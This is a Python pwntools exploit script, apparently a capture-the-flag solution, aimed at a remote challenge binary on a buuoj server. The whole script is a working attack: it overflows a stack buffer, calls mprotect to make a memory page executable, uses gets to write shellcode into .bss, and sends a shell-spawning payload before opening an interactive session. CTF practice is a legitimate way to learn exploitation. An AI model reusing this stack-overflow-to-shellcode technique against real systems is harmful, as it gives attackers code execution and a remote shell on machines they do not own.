#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
context.arch = 'i386'

# io = process('./pwn')
io = remote('node2.buuoj.cn.wetolink.com', 28980)
elf = ELF('./pwn')

mpro = elf.sym['mprotect']
padding = 'a' * 0x38
payload = padding + p32(mpro) + p32(elf.sym['main'])

payload += p32(0x80eb000) + p32(0x1000) + p32(7)
raw_input('mprotect')
io.sendline(payload)

payload = padding + p32(elf.sym['gets']) + p32(elf.bss())
payload += p32(elf.bss())
raw_input('gets')
io.sendline(payload)

raw_input('shellcode')
io.sendline(asm(shellcraft.sh()))

io.interactive()
io.close()


